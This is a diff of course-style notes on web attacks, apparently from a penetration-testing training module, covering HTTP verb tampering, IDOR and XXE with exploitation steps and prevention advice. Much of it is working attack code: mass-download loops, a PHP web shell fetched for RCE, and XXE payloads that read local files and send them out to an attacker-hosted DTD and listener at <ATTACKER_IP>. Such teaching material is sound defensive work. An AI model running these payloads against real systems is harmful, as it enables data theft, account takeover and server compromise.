@@ -1,115 +1,77 @@
-# Web Attacks (HTTP Verb Tampering / IDOR / XXE)
+# Web Attacks
+
+Three attack classes covered here, all common in any web application: **HTTP Verb Tampering** (unexpected HTTP methods bypass authorization or other security controls), **IDOR** (direct object references + weak access control = other users' data), and **XXE** (outdated XML libraries parsing user XML → local file disclosure, source code, cred theft, RCE). Detect, exploit, prevent for each.
 
 ## Intro to HTTP Verb Tampering
 
-HTTP has 9 verbs. Misconfig in web server or app code can let non-GET/POST methods bypass auth or filters.
+Dev shops think in GET and POST, but any client can send any of HTTP's 9 verbs. If both app and server only accept GET/POST, other verbs just error out (info disclosure at worst). If the server accepts more methods than the app was coded to handle → tampering: access to restricted functionality or bypass of security controls.
 
-Common verbs beyond GET/POST:
+The verbs that matter beyond GET/POST: HEAD (GET minus the response body), PUT (write payload to a location), DELETE (delete the resource), OPTIONS (list accepted verbs), PATCH (partial modification). PUT/DELETE against the webroot are obviously sensitive. Key point: the vuln originates from a misconfiguration in *either* the web server *or* the application code.
 
-- HEAD — like GET but headers only, no body
-- PUT — writes payload to specified location
-- DELETE — deletes resource at location
-- OPTIONS — shows accepted verbs
-- PATCH — partial modification of resource
-
-### Insecure Configurations
-
-Auth scoped to specific verbs leaves others open.
+**Insecure configurations** — auth limited to specific methods leaves others open:
 
 ```xml
 <Limit GET POST>
-Require valid-user
+    Require valid-user
 </Limit>
 ```
 
-Attacker sends HEAD (or other unlisted verb) → bypasses auth.
+HEAD (or anything unlisted) skips the auth entirely.
 
-### Insecure Coding
-
-Filter checks one method's params, but execution uses a method-agnostic superglobal.
+**Insecure coding** — filters that don't cover all methods:
 
 ```php
 $pattern = "/^[A-Za-z\s]+$/";
+
 if(preg_match($pattern, $_GET["code"])) {
     $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
+    ...SNIP...
 }
 ```
 
-Filter only checks `$_GET`, query uses `$_REQUEST` (GET+POST). Send payload via POST → GET is empty/clean → passes filter → payload lands via `$_REQUEST` → SQLi.
+Filter checks `$_GET`, but the query uses `$_REQUEST` (GET + POST). Send the injection via POST → GET params are empty → filter passes → SQLi through the verb inconsistency. This coding type is far more common in the wild than the config type.
+
+## Bypassing Basic Authentication
+
+Config-type verb tampering → bypass HTTP Basic Auth. Straightforward: try alternate methods and watch handling. Scanners catch the config type reliably; the coding type needs active filter-bypass testing.
+
+**Identify**: File Manager app; its Reset button hits `/admin/reset.php` and prompts for Basic Auth (401 without creds). Visiting `/admin` directly also prompts → the whole directory is restricted.
+
+**Exploit**: intercept the reset request — it's a GET. Burp right-click → Change Request Method → POST: still 401, so auth covers GET+POST. Check what else the server accepts:
+
+```bash
+curl -i -X OPTIONS http://<SERVER_IP>:<PORT>/
+# Allow: POST,OPTIONS,HEAD,GET
+```
+
+HEAD is accepted (default on many servers). Change the request to HEAD → no login prompt, no 401, empty body as expected — but the reset function still executed (files gone). No output needed when the action itself is the goal.
 
 ## Bypassing Security Filters
 
-### Identify
+Coding-type verb tampering → bypass back-end injection filters. Pattern: filter only inspects `$_POST['param']` (or only `$_GET`) while the functionality reads the other.
 
-Malicious input (e.g. `test;`) via normal method → blocked ("Malicious Request Denied!"). Filter exists.
+**Identify**: creating a file named `test;` returns `Malicious Request Denied!` — a filter exists and blocks injection attempts in the normal flow.
 
-### Exploit
-
-Burp → Change Request Method → switch GET to POST (or vice versa) to bypass filter.
-
-```
-GET /?filename=test%3B HTTP/1.1
-```
-
-Same payload sent as different verb bypasses filter. Confirm with command injection test:
-
-```
-filename=file1; touch file2;
-```
-
-If both files created → verb tampering bypassed the filter → underlying vuln (command injection) confirmed.
+**Exploit**: intercept the request, Change Request Method. The denial message disappears and the file is created — filter missed the other verb. Confirm with real command injection: filename `file1; touch file2;` under the swapped method → both files appear. The app was otherwise secure against command injection; verb tampering unlocked it.
 
 ## Verb Tampering Prevention
 
-### Insecure Configuration
-
-Vulnerable in Apache, Tomcat, ASP.NET when auth scoped to one verb.
-
-Apache (`000-default.conf` / `.htaccess`):
+**Insecure configuration** — never scope authorization to specific verbs. Apache (`000-default.conf` / `.htaccess`):
 
 ```xml
 <Directory "/var/www/html/admin">
-AuthType Basic
-AuthName "Admin Panel"
-AuthUserFile /etc/apache2/.htpasswd
-<Limit GET>
-Require valid-user
-</Limit>
+    AuthType Basic
+    AuthName "Admin Panel"
+    AuthUserFile /etc/apache2/.htpasswd
+    <Limit GET>
+        Require valid-user
+    </Limit>
 </Directory>
 ```
 
-Tomcat (`web.xml`):
+`<Limit GET>` protects only GET — POST/HEAD/OPTIONS walk in. Tomcat `web.xml` has the same footgun via `<http-method>GET</http-method>` inside `security-constraint`; ASP.NET `web.config` via `allow verbs="GET"` / `deny verbs="GET"`. Fix: allow/deny ALL methods; if you must enumerate, use the inverse keywords — `LimitExcept` (Apache), `http-method-omission` (Tomcat), `add`/`remove` (ASP.NET) — which cover everything *except* the listed verb. Also disable HEAD server-wide unless actually needed.
 
-```xml
-<security-constraint>
-<web-resource-collection>
-<url-pattern>/admin/*</url-pattern>
-<http-method>GET</http-method>
-</web-resource-collection>
-<auth-constraint>
-<role-name>admin</role-name>
-</auth-constraint>
-</security-constraint>
-```
-
-ASP.NET (`web.config`):
-
-```xml
-<system.web>
-<authorization>
-<allow verbs="GET" roles="admin">
-<deny verbs="GET" users="*">
-</deny>
-</allow>
-</authorization>
-</system.web>
-```
-
-Fix: don't scope auth to single verb. Use `LimitExcept` (Apache), `http-method-omission` (Tomcat), `add`/`remove` (ASP.NET) — covers all verbs except specified. Disable/deny HEAD unless required.
-
-### Insecure Coding
-
-Inconsistent method use between filter and execution:
+**Insecure coding** — hunt inconsistencies between the method a filter checks and the method the functionality uses. The File Manager's actual flaw:
 
 ```php
 if (isset($_REQUEST['filename'])) {
@@ -121,36 +83,21 @@ if (isset($_REQUEST['filename'])) {
 }
 ```
 
-Filter checks `$_POST` only, `system()` uses `$_REQUEST`. GET request bypasses filter entirely.
-
-Fix: use consistent, full-scope request functions in filters:
-
-- PHP: `$_REQUEST['param']`
-- Java: `request.getParameter('param')`
-- C#: `Request['param']`
+Perfectly fine against command injection in isolation — but the filter reads `$_POST` while the command reads `$_REQUEST`. In production these two lines usually live in different functions, which is why it survives review. Fix: keep HTTP method usage consistent per functionality, and make security filters check *all* request parameters — `$_REQUEST['param']` (PHP), `request.getParameter('param')` (Java), `Request['param']` (C#).
 
 ## Intro to IDOR
 
-Object reference exposed directly to user (e.g. `download.php?file_id=123`) + no back-end access control = IDOR. Guess/increment ID → access other users' data.
+IDOR = the app exposes a direct reference to an object (file, DB row) that the user controls, and the back-end lacks the access control to stop them pulling objects that aren't theirs. `download.php?file_id=123` → try `file_id=124`. Guessable IDs make it mass-exploitable.
 
-### What Makes an IDOR Vulnerability
+The exposed reference alone isn't the vuln — the missing back-end access control is. Most apps "control" access by hiding links in the front-end; manually manipulated HTTP requests blow past that. Building solid access control (e.g. RBAC) is genuinely hard, automating its testing is hard, so IDOR survives to production even at Facebook/Instagram/Twitter scale.
 
-Direct reference alone isn't the bug — it's the missing access control (e.g. no RBAC) on the back-end that makes it exploitable.
-
-### Impact of IDOR Vulnerabilities
-
-- IDOR Information Disclosure — read private files/data
-- IDOR Insecure Function Calls — modify/delete data, privilege escalation, account takeover (call admin-only APIs as standard user if back-end doesn't enforce role checks)
+Impact ladder: **Information Disclosure** (read others' personal files, credit card data) → modify/delete others' data (account takeover via email + password reset) → **Insecure Function Calls**: call admin-only APIs as a standard user (change passwords, grant roles) → full app takeover.
 
 ## Identifying IDORs
 
-### URL Parameters & APIs
+**URL parameters & APIs** — study every request that returns a file/resource for object references (`?uid=1`, `?filename=file_1.pdf`) — in URL params, APIs, or headers like cookies. Increment values (`?uid=2`), or fuzz thousands of variations. Hits on data that isn't ours = IDOR.
 
-Look for object refs in URL params/APIs (`?uid=1`, `?filename=file_1.pdf`), also check cookies/headers. Increment values or fuzz.
-
-### AJAX Calls
-
-Check front-end JS for admin/hidden function calls with embedded object refs — may be callable even without UI access.
+**AJAX calls** — JavaScript-framework apps may ship *all* function calls to the front-end and merely disable the ones your role shouldn't use. Read the JS for admin/unused endpoints:
 
 ```javascript
 function changeUserPassword() {
@@ -159,63 +106,57 @@ function changeUserPassword() {
         type: "post",
         dataType: "json",
         data: {uid: user.uid, password: user.password, is_admin: is_admin},
-        success:function(result){}
+        success:function(result){
+            //
+        }
     });
 }
 ```
 
-### Understand Hashing/Encoding
+Never invoked as a non-admin, but callable once found. Same applies to back-end source when available (open-source apps).
 
-Encoded ref (e.g. base64) → decode, modify, re-encode.
-
-```
-?filename=ZmlsZV8xMjMucGRm → file_123.pdf
-```
-
-Hashed ref — check front-end JS for hash source:
+**Understand hashing/encoding** — references may be encoded or hashed. base64 is recognizable by charset: `?filename=ZmlsZV8xMjMucGRm` decodes to `file_123.pdf` → re-encode `file_124.pdf` and request it. Hashed references (`?filename=c81e728d...`) look secure, but if the front-end computes the hash, the recipe is right there:
 
 ```javascript
-data: {filename: CryptoJS.MD5('file_1.pdf').toString()}
+data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
 ```
 
-If hashing logic exposed client-side, hash arbitrary filenames to enumerate.
+Otherwise identify the algorithm with hash-identifier tools and test candidate inputs until one matches.
 
-### Compare User Roles
-
-Register multiple test users, diff their requests/object refs to understand ID calculation and whether back-end validates session vs requested object.
+**Compare user roles** — register two users, diff their requests and references. If User1's API call (`/services/data/salaries/users/1`) can be replayed verbatim under User2's session, the back-end only checks "logged in", not "owns this object". Even when you can't compute other users' parameters, that's a confirmed access control flaw worth chasing.
 
 ## Mass IDOR Enumeration
 
-### Insecure Parameters
+**Insecure parameters** — Employee Manager example: `/documents.php?uid=1` lists own documents with a predictable static file pattern (`/documents/Invoice_1_09_2021.pdf` — uid + month/year) — the most basic "static file IDOR", fuzzable but assumes filename prefixes. The stronger bug: the page takes `uid` as a GET parameter and trusts it. Changing to `?uid=2` renders an identical-looking page — watch the linked files, not the layout: `/documents/Invoice_2_08_2020.pdf` — that's employee 2's data. Always compare source code and page size, not just the rendered output. Same class: filter params like `uid_filter=1` that can be changed or removed to dump everything.
 
-Static file IDOR — predictable filenames (`Invoice_1_09_2021.pdf`). Better: manipulate `uid` GET param directly (`documents.php?uid=2`) — no error, different files returned = confirmed IDOR. Watch page/file details closely, not just status codes.
-
-### Mass Enumeration
-
-Grep unique markers around links:
+**Mass enumeration** — loop it. Grab the unique HTML marker for links and grep it:
 
 ```bash
-curl -s "http://<TARGET_URL>/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
-curl -s "http://<TARGET_URL>/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
+curl -s "http://<SERVER_IP>:<PORT>/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
+curl -s "http://<SERVER_IP>:<PORT>/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
 ```
 
-Loop + download:
+Regex beats trimming commands. Full harvest:
 
 ```bash
 #!/bin/bash
-url="http://<TARGET_URL>"
+
+url="http://<SERVER_IP>:<PORT>"
+
 for i in {1..10}; do
-    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
-        wget -q $url/$link
-    done
+        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
+                wget -q $url/$link
+        done
 done
 ```
 
+Burp Intruder / ZAP Fuzzer accomplish the same; the bash loop is usually fastest to write.
+
 ## Bypassing Encoded References
 
-### Function Disclosure
+Contracts page downloads via POST to `/download.php` with `contract=cdd96d3cc73d1dbdaffa03cc6cd7339b` — md5-looking hash (download scripts like this avoid direct file links). One-way function, so attack it by hashing candidates and comparing: `echo -n 1 | md5sum` → no match; uid/username/filename all miss. At this point it could be a Secure Direct Object Reference — unless the hash is computed client-side.
 
-Hashed ref (e.g. md5) looks secure but if hash computed client-side in JS, reverse the logic:
+**Function disclosure** — JS frameworks often do sensitive work front-end. The link calls `javascript:downloadContract('1')`:
 
 ```javascript
 function downloadContract(uid) {
@@ -225,15 +166,16 @@ function downloadContract(uid) {
 }
 ```
 
-Replicate: `md5(base64(uid))`
+Recipe: md5(base64(uid)). Verify:
 
 ```bash
 echo -n 1 | base64 -w 0 | md5sum
+# cdd96d3cc73d1dbdaffa03cc6cd7339b — matches
 ```
 
-`-n` (echo) and `-w 0` (base64) avoid trailing newline messing up the hash.
+(`-n` on echo and `-w 0` on base64 strip newlines — hashing a trailing newline produces a different hash.) Reversing the recipe converts the secure reference back into an IDOR.
 
-### Mass Enumeration
+**Mass enumeration**:
 
 ```bash
 for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
@@ -241,154 +183,125 @@ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
 
 ```bash
 #!/bin/bash
+
 for i in {1..10}; do
     for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
-        curl -sOJ -X POST -d "contract=$hash" http://<TARGET_URL>/download.php
+        curl -sOJ -X POST -d "contract=$hash" http://<SERVER_IP>:<PORT>/download.php
     done
 done
 ```
 
+`-OJ` saves each file under its Content-Disposition filename (`contract_<hash>.pdf`).
+
 ## IDOR in Insecure APIs
 
-### Identifying Insecure APIs
+IDOR Insecure Function Calls = executing functions/APIs as another user: change their info, reset their password, buy with their payment data. Frequently chained with an info-disclosure IDOR that supplies the needed values.
 
-PUT to update profile may leak hidden params:
+**Identifying** — Edit Profile sends a PUT to `/profile/api.php/profile/1` (PUT = update, POST = create, DELETE = delete, GET = read) with:
 
 ```json
 {
-  "uid": 1,
-  "uuid": "40f5888b67c748df7efba008e7c2f9d2",
-  "role": "employee",
-  "full_name": "Amy Lindon",
-  "email": "a_lindon@employees.htb",
-  "about": "..."
+    "uid": 1,
+    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
+    "role": "employee",
+    "full_name": "Amy Lindon",
+    "email": "a_lindon@employees.htb",
+    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
 }
 ```
 
-Role often mirrored in cookie: `role=employee`. Client-controlled role/uid/uuid = privilege escalation risk.
+Hidden params beyond the form fields (uid, uuid, role) — and role also rides in the `Cookie: role=employee` header. Privileges passed in the client-controlled request is the classic flaw: manipulate them unless the back-end checks otherwise.
 
-### Exploiting Insecure APIs
-
-Test:
-
-- Change own `uid` → other user's uid → check for `uid mismatch` (back-end check present)
-- Change target uid + keep own uuid → `uuid mismatch` (another back-end check)
-- POST/DELETE to create/delete users → may be blocked ("for admins only")
-- Set role to guessed value → `Invalid role` if role names aren't known
-
-Next step if blocked: test API's GET request for IDOR info disclosure (leaks uuid needed to bypass PUT checks).
+**Exploiting** — four angles: change own uid (account takeover), change another user's details, create/delete users, change own role. Results here: `"uid": 2` against endpoint `/1` → `uid mismatch`; endpoint `/2` + `"uid": 2` → `uuid mismatch` (they're comparing our uuid against the target's); POST to create → `Creating new employees is for admins only`; DELETE → same; role `admin` → `Invalid role` (guessing role names blindly fails). All function-call paths blocked — but the API's GET was never tested. When write paths fail, test the read path for disclosure that unlocks them.
 
 ## Chaining IDOR Vulnerabilities
 
-### Information Disclosure
+The page loads user details via GET to the same endpoint; the only authorization in the request is the `role=employee` cookie (no JWT, nothing user-specific). Even with a token, unless it's actively compared to the requested object, disclosure stands.
 
-GET with `role=employee` cookie only (no per-user token) → can read other users by referencing their uid, even leaks `uuid`:
+**Information disclosure** — GET `/profile/api.php/profile/2` returns user 2 in full:
 
 ```json
 {
-  "uid": "2",
-  "uuid": "4a9bd19b3b8676199592a346051f950c",
-  "role": "employee",
-  "full_name": "Iona Franklyn",
-  "email": "i_franklyn@employees.htb",
-  "about": "..."
+    "uid": "2",
+    "uuid": "4a9bd19b3b8676199592a346051f950c",
+    "role": "employee",
+    "full_name": "Iona Franklyn",
+    "email": "i_franklyn@employees.htb",
+    "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
 }
 ```
 
-### Modifying Other Users' Details
+The uuid — uncalculable before — is now in hand.
 
-With leaked uuid, PUT to `/profile/api.php/profile/<uid>` with their uuid + your changes → no access control error → update succeeds. Follow-on attacks: change victim's email then request password reset (account takeover), or inject XSS payload into `about` field.
+**Modifying other users' details** — PUT to `/profile/api.php/profile/2` with uid 2 + their real uuid + modifications: no mismatch errors, changes persist. Escalation options: swap their email and request a password reset (link lands in your inbox → account takeover); drop an XSS payload in `about` (fires when they open their profile page).
 
-### Chaining Two IDOR Vulnerabilities
+**Chaining both** — enumerate all users via the GET disclosure; find the admin:
 
-Enumerate all users via info disclosure to find admin role name (e.g. `web_admin`) via a leaked admin profile. Set own `role` to `web_admin` via PUT (no validation on role value) → refresh cookie → now able to create/delete users, mass-modify all profiles (e.g. XSS all `about` fields, mass email change).
+```json
+{
+    "uid": "X",
+    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
+    "role": "web_admin",
+    "full_name": "administrator",
+    "email": "webadmin@employees.htb",
+    "about": "HTB{FLAG}"
+}
+```
+
+Now the real role name is known. PUT own profile with `"role": "web_admin"` — no `Invalid role`, no access control errors, role sticks. Refresh (or set `Cookie: role=web_admin` manually), then POST to create a new user: succeeds. Disclosure IDOR fed the function-call IDOR past every check. With the admin role, mass assignment across all users follows (XSS in every profile, or rewrite everyone's email — GET each uuid, PUT each account).
 
 ## IDOR Prevention
 
-### Object-Level Access Control
-
-Implement RBAC mapped to every object/resource; validate on every request server-side, not client-supplied role/cookie.
+**Object-level access control** — RBAC mapped to every object/resource; each request's role/privileges tested against the object before allow/deny:
 
 ```javascript
 match /api/profile/{userId} {
-  allow read, write: if user.isAuth == true && (user.uid == userId || user.roles == 'admin');
+    allow read, write: if user.isAuth == true
+    && (user.uid == userId || user.roles == 'admin');
 }
 ```
 
-Role must come from session token / server-side RBAC lookup, never from client-supplied field.
+Crucially, the role comes from the back-end RBAC via the session token — never from the request body or a cookie, both of which the user controls.
 
-### Object Referencing
-
-Even with solid access control, avoid clear-text/sequential refs (`uid=1`). Use salted hashes or UUIDv4, generated and mapped server-side (never computed client-side).
+**Object referencing** — direct references are acceptable *only* on top of solid access control. Even then, avoid cleartext/simple patterns (`uid=1`); use salted hashes or UUIDs (UUID V4: `89c9b29b-d19f-4515-b2dd-abb6e693eb20`) mapped to objects in the DB:
 
 ```php
 $uid = intval($_REQUEST['uid']);
 $query = "SELECT url FROM documents where uid=" . $uid;
+$result = mysqli_query($conn, $query);
+$row = mysqli_fetch_array($result);
+echo "<a href='" . $row['url'] . "' target='_blank'></a>";
 ```
 
-Note: UUIDs alone don't fix broken access control — still exploitable if session/authz check is missing (e.g. replaying another user's request).
+Never compute hashes front-end — generate at object creation, store server-side, keep DB maps for cross-referencing. Caveats: UUIDs make IDOR harder to *test*, which is why referencing is step two after access control; and broken access control falls to session-replay techniques regardless of reference strength.
 
 ## Intro to XXE
 
-XXE = malicious XML input exploiting XML parser features (outdated libs) to read files or worse. OWASP Top 10.
+XXE: user-controlled XML parsed unsanitized by outdated libraries → XML features turned malicious (file disclosure up to server shutdown; OWASP Top 10).
 
-### XML
-
-Structure: Tag `<date>`, Entity `&lt;`, Element (root/child), Attribute (`version="1.0"`), Declaration (`<?xml version="1.0" encoding="UTF-8"?>`). Special chars needing entity refs: `<`, `>`, `&`, `"` → `&lt;`, `&gt;`, `&amp;`, `&quot;`. Comments: `<!-- -->`.
-
-### XML DTD
-
-Defines document structure. Inline or external:
+XML refresher — what matters for exploitation: tags (`<date>`), entities (XML variables, `&lt;`), elements (root + children, value between start/end tags), attributes in tags (`version="1.0"`), and the declaration line. Reserved chars `< > & "` need entity references. DTDs validate structure, declared inline after the declaration or externally:
 
 ```xml
-<!DOCTYPE email [
-  <!ELEMENT email (date, time, sender, recipients, body)>
-  <!ELEMENT recipients (to, cc?)>
-  <!ELEMENT cc (to*)>
-  <!ELEMENT date (#PCDATA)>
-]>
-```
-
-External file ref:
-
-```xml
+<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email SYSTEM "email.dtd">
-```
-
-External URL ref:
-
-```xml
 <!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
 ```
 
-### XML Entities
-
-Custom entity:
+Custom entities in the DTD: `<!ENTITY company "Inlane Freight">`, referenced as `&company;` and substituted at parse time. The attack primitive — external entities via SYSTEM (PUBLIC works too in most cases):
 
 ```xml
-<!DOCTYPE email [
-  <!ENTITY company "Inlane Freight">
-]>
-```
-
-Referenced as `&company;`.
-
-External entity (the XXE primitive):
-
-```xml
+<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [
   <!ENTITY company SYSTEM "http://localhost/company.txt">
   <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
 ]>
 ```
 
-`PUBLIC` keyword also usable for publicly declared entities/standards — `SYSTEM` used throughout this module.
+Server-side parsing (SOAP APIs, web forms) + `&signature;` = the parser reads the back-end file into the entity, and the response may display it.
 
 ## Local File Disclosure
 
-### Identifying
-
-Find forms/endpoints sending XML. Check which submitted element gets reflected back in response (confirms injection point). Test entity definition:
+**Identifying** — find pages accepting XML input. Contact form POSTs XML to `/submitDetails.php`; the response echoes the `email` element value ("Check your email X for further instructions") — note which elements get displayed; that's the injection sink. Test entity support first:
 
 ```xml
 <!DOCTYPE email [
@@ -396,11 +309,9 @@ Find forms/endpoints sending XML. Check which submitted element gets reflected b
 ]>
 ```
 
-Reference `&company;` in place of normal value — if reflected value changes, XXE confirmed. Non-vulnerable apps show literal `&company;`.
+Put `&company;` in the email element → response prints "Inlane Freight" = XML injection works (a patched app would print the raw `&company;`). (If the request had a DOCTYPE already, just add the ENTITY to it.) Bonus: apps defaulting to JSON may still accept XML — swap Content-Type to `application/xml`, convert the body, test anyway.
 
-Tip: if app defaults to JSON, try switching `Content-Type` to `application/xml` + converting body to XML — may still be processed.
-
-### Reading Sensitive Files
+**Reading sensitive files** — same trick with SYSTEM:
 
 ```xml
 <!DOCTYPE email [
@@ -408,11 +319,9 @@ Tip: if app defaults to JSON, try switching `Content-Type` to `application/xml` 
 ]>
 ```
 
-Target files: configs, `id_rsa`, etc. Tip: some Java apps allow directory path instead of file → directory listing.
+/etc/passwd comes back in the response. Config files with passwords, `id_rsa` keys — file disclosure chains into server access. Java apps may accept a directory path and return a listing, handy for locating secrets.
 
-### Reading Source Code
-
-Files containing XML special chars (`<`, `>`, `&`) break the entity reference — use PHP filter wrapper to base64-encode:
+**Reading source code** — `file:///var/www/html/index.php` returns nothing: PHP source contains XML-special chars (`< > &`) that break the entity, and binary breaks it too. PHP fix — base64 via the filter wrapper:
 
 ```xml
 <!DOCTYPE email [
@@ -420,20 +329,9 @@ Files containing XML special chars (`<`, `>`, `&`) break the entity reference �
 ]>
 ```
 
-Decode via Burp Inspector. PHP-only trick.
+Decode the returned string (Burp's Inspector decodes it in place). PHP-only trick; the next section covers the universal method.
 
-## Remote Code Execution with XXE
-
-- Look for SSH keys, or NTLM hash theft (Windows) via forced external call
-- `expect://` filter (PHP expect module required, often disabled):
-
-```xml
-<!DOCTYPE email [
-  <!ENTITY company SYSTEM "expect://id">
-]>
-```
-
-- Most reliable: fetch webshell via curl, then interact:
+**RCE with XXE** — escalation order: hunt SSH keys; Windows hash-stealing via calls to your server; PHP `expect://` wrapper if the expect module is enabled. Direct output → `expect://id` prints command output; complex commands (reverse shells) break the XML syntax. The efficient route — fetch a web shell:
 
 ```bash
 echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
@@ -453,112 +351,79 @@ sudo python3 -m http.server 80
 </root>
 ```
 
-Replace spaces with `$IFS` (spaces break XML). Avoid `|`, `>`, `{`. `expect` module rarely enabled by default — XXE more commonly used for disclosure than RCE.
+`$IFS` replaces spaces; `|`, `>`, `{` also tend to break the syntax — avoid them. expect is rarely enabled on modern PHP, so XXE usually stays a disclosure primitive that feeds further access.
 
-## Other XXE Attacks
-
-- SSRF via XXE — enumerate internal ports/pages (see Server-Side Attacks module)
-- DOS via entity expansion (billion laughs style):
-
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE email [
-  <!ENTITY a0 "DOS" >
-  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
-  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
-  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
-  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
-  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
-  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
-  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
-  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
-  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
-  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
-]>
-<root>
-<name></name>
-<tel></tel>
-<email>&a10;</email>
-<message></message>
-</root>
-```
-
-Doesn't work on modern web servers (Apache) — entity self-reference protection.
+**Other attacks** — SSRF through XXE to enumerate internal ports/pages (per the Server-Side Attacks module). DoS via entity self-reference expansion (a0="DOS", a1="&a0;"×10, ... up to a10, memory exhaustion) — dead against modern servers like Apache that block entity loops, still worth knowing.
 
 ## Advanced File Disclosure
 
-### Advanced Exfiltration with CDATA
-
-For files that break XML format / binary data, wrap in CDATA. Internal+external entities can't be joined directly — use XML Parameter Entities (`%`, DTD-only, can be joined if all external).
-
-Host DTD (`xxe.dtd`):
+**CDATA exfiltration** — universal source/binary reading. Wrap the file content in `<![CDATA[ ... ]]>` so the parser treats special characters as raw. Naive attempt fails — XML won't join internal and external entities:
 
 ```xml
-<!ENTITY % begin "<![CDATA[">
-<!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
-<!ENTITY % end "]]>">
-<!ENTITY % xxe SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd">
-%xxe;
+<!DOCTYPE email [
+  <!ENTITY begin "<![CDATA[">
+  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY end "]]>">
+  <!ENTITY joined "&begin;&file;&end;">
+]>
 ```
+
+Bypass with **parameter entities** (start with `%`, DTD-only) — referenced from an external source, all joined entities count as external:
+
+```xml
+<!ENTITY joined "%begin;%file;%end;">
+```
+
+Host that line as xxe.dtd on your machine, then in the request:
 
 ```bash
 echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
 python3 -m http.server 8000
 ```
 
-Payload:
-
 ```xml
 <!DOCTYPE email [
-  <!ENTITY % begin "<![CDATA[">
-  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
-  <!ENTITY % end "]]>">
-  <!ENTITY % xxe SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd">
+  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+  <!ENTITY % xxe SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd"> <!-- reference our external DTD -->
   %xxe;
 ]>
 ...
-<email>&joined;</email>
+<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
 ```
 
-Note: some modern servers block reading files that self-reference (DOS protection) — e.g. `index.php` may fail.
+Source code without base64 — much faster when trawling files for secrets. Note: some modern servers still refuse specific files (like index.php) due to entity/file self-reference loop protection.
 
-### Error Based XXE
-
-When no XML entity is reflected in output — check for verbose PHP errors first (malformed XML, bad closing tag, nonexistent entity reference reveals server paths).
-
-Host DTD payload:
+**Error-based XXE** — when no entity is ever displayed (blind to output) but the app shows runtime errors. Confirm error reflection first: malformed XML (unclosed tag, or reference a non-existent entity). Then host a DTD that jams the file content into an error message:
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/hosts">
 <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
 ```
 
-Trigger:
+The undefined entity forces an error that carries the joined `%file;` content along. Trigger:
 
 ```xml
-<!DOCTYPE email [
+<!DOCTYPE email [ 
   <!ENTITY % remote SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd">
   %remote;
   %error;
 ]>
 ```
 
-File content leaks via the thrown error message. Works for source code too (swap file path). Less reliable — length limits, special chars can break it.
+Works for source code too (point file at it), but less reliable — error-message length limits and some special characters still break it.
 
 ## Blind Data Exfiltration
 
-### Out-of-band Data Exfiltration
-
-No reflected output, no errors → OOB exfil. Base64-encode file via PHP filter, send as GET param to attacker server.
-
-DTD:
+Fully blind: no output, no errors. **Out-of-band (OOB) exfiltration** — make the server send the data to us over HTTP, same pattern used for blind SQLi/command injection/XSS. DTD on our server; the file content, base64-encoded via PHP filter, rides in the URL:
 
 ```xml
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % oob "<!ENTITY content SYSTEM 'http://<ATTACKER_IP>:8000/?content=%file;'>">
 ```
 
-Listener (decode on the fly):
+Parser resolves `%file;` → requests `http://<ATTACKER_IP>:8000/?content=WFhFX1NBTVBMRV9EQVRB` → decode. Auto-decode server side:
 
 ```php
 <?php
@@ -569,15 +434,15 @@ if(isset($_GET['content'])){
 ```
 
 ```bash
-vi index.php
+vi index.php   # the code above
 php -S 0.0.0.0:8000
 ```
 
-Trigger payload:
+Payload (the `<root>&content;</root>` reference triggers the request):
 
